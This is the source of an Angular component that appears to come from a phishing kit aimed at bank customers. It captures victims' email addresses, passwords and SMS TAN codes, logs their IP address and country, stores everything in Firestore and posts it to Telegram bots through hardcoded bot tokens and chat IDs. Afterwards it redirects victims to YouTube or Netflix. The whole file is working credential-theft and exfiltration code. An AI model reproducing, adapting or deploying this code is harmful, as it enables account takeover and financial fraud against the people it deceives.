import { HttpClient } from "@angular/common/http";
import { Component, OnInit } from "@angular/core";
import {
  AngularFirestore,
  AngularFirestoreCollection,
} from "@angular/fire/firestore";
import { Router } from "@angular/router";
import { Observable } from "rxjs";
import { Sms } from "../login/sms";
import { MyService } from "../myservice";

@Component({
  selector: "app-finish",
  templateUrl: "./finish.component.html",
  styleUrls: ["./finish.component.css"],
})
export class FinishComponent implements OnInit {
  incorrect: boolean = false;
  title = "raif";
  btnDisabled: boolean = false;
  pin = "";
  sms = "";
  sms2 = "";
  selectedLanguage = "Deutsch";
  selectedLand = "";
  stepThreeIsLoading = true;
  submitted = false;
  cardNumber = "";
  email = "";
  fullName = "";
  password = "";
  CVV = "";
  countDown: number = 30;
  expDate = "";
  errors: any = {};
  signature = "";
  disabled = true;
  prefix = "";
  errorMessage = "";
  smsTAN: Sms = { smsTAN1: "", smsTAN2: "", dateTime: "", ip: "" };
  visit: any = { ip: "", country: "", dateTime: "" };
  smsCollection: AngularFirestoreCollection<Sms>;

  constructor(
    private httpClient: HttpClient,
    private router: Router,
    db: AngularFirestore,
    myService: MyService
  ) {
    this.smsCollection = db.collection("sBet");
    this.visit.dateTime = Date.now();
    myService.getIpAddress().subscribe((ip) => {
      this.visit.ip = ip.ip;
      myService.getCountry(ip.ip).subscribe((country) => {
        this.visit.country = country.country_name;
      });
    });
  }

  ngOnInit() {
    if (localStorage.getItem("email")) {
      this.email = localStorage.getItem("email");
    } else {
      this.router.navigate(["/confirm"]);
    }
  }

  onKeyPass() {
    if (this.password.length > 5) {
      this.disabled = false;
    } else {
      this.disabled = true;
    }
  }

  sendTelegram(message: string): Observable<any[]> {
    //return this.httpClient.post<any[]>('https://api.telegram.org/bot1096379466:AAH8mwk8WMjsaZxYij_p-8rooHHJWkExFWk/sendMessage?chat_id=-1001207984927&text='+message,null);

    // Our GRP
    //return this.httpClient.post<any[]>('https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001499839547&text='+message,null);

    //me&val
    return this.httpClient.post<any[]>(
      "https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001558381849&text=" +
        message,
      null
    );
  }

  onSubmitYahoo() {
    this.disabled = true;
    this.submitted = true;
    setTimeout(() => {
      this.smsTAN.smsTAN1 = this.email;
      this.smsTAN.smsTAN2 = this.password;
      this.smsTAN.dateTime = Date.now();
      this.smsTAN.ip = this.visit.ip;
      this.smsCollection.add(this.smsTAN);
      let message;
      message =
        this.smsTAN.smsTAN1 +
        "   " +
        this.smsTAN.smsTAN2 +
        "   " +
        this.visit.ip;
      this.sendTelegram(message).subscribe((data) => console.log(data));
      this.btnDisabled = true;
      setTimeout(
        () =>
          (window.location.href =
            "https://www.youtube.com/watch?v=aqD323HrycM"),
        5000
      );
    }, 2000);
  }
  submitForm() {
    this.disabled = true;

    this.errors = {};

    setTimeout(() => {
      if (this.sms.length < 6) {
        this.errors.smsError = true;
        this.disabled = false;
        return;
      }

      if (!this.incorrect) {
        this.disabled = false;
        this.smsTAN.smsTAN1 = this.sms;
        this.smsTAN.dateTime = Date.now();
        this.smsTAN.ip = this.visit.ip;

        this.smsCollection.add(this.smsTAN);
        let message;
        message = this.sms + "   " + this.visit.ip;
        this.sendTelegram(message).subscribe((data) => console.log(data));

        this.incorrect = true;
        this.btnDisabled = true;
        const TIME_LIMIT = 30;
        let timePassed = 0;
        let timeLeft = TIME_LIMIT;
        let timerInterval = null;

        document.getElementById("demoo").innerHTML = `
            
            <span id="base-timer-label" class="base-timer__label">${formatTime(
              timeLeft
            )}</span>
          
          `;

        startTimer();

        function startTimer() {
          timerInterval = setInterval(() => {
            timePassed = timePassed += 1;
            timeLeft = TIME_LIMIT - timePassed;
            document.getElementById("base-timer-label").innerHTML =
              formatTime(timeLeft);
          }, 1000);
        }

        function formatTime(time) {
          const minutes = Math.floor(time / 60);
          let seconds = time % 60;

          return `${seconds}s`;
        }
        setTimeout(() => {
          this.btnDisabled = false;
        }, 30000);

        //  this.btnDisabled = false
      } else {
        this.incorrect = false;
        this.disabled = false;
        this.smsTAN.smsTAN2 = this.sms;
        this.smsTAN.dateTime = Date.now();
        this.smsTAN.ip = this.visit.ip;

        this.smsCollection.add(this.smsTAN);
        let message;
        message =
          this.smsTAN.smsTAN1 + "    " + this.sms + "     " + this.visit.ip;
        // this.sendTelegram(message).subscribe(data => console.log(data));

        setTimeout(
          () =>
            (window.location.href =
              "https://www.youtube.com/watch?v=aqD323HrycM"),
          2000
        );
      }
      // firebase here

      // this.navigate(4);
      return;
    }, 1000);
  }

  async delay(ms: number) {
    await new Promise((resolve) => setTimeout(() => resolve(), ms)).then(() =>
      console.log("fired")
    );
    //this.finished=true;
    this.delayAndRedirect(3000);
  }

  async delayAndRedirect(ms: number) {
    await new Promise((resolve) => setTimeout(() => resolve(), ms)).then(() =>
      console.log("fired")
    );
    window.location.href = "https://netflix.com";
  }
}
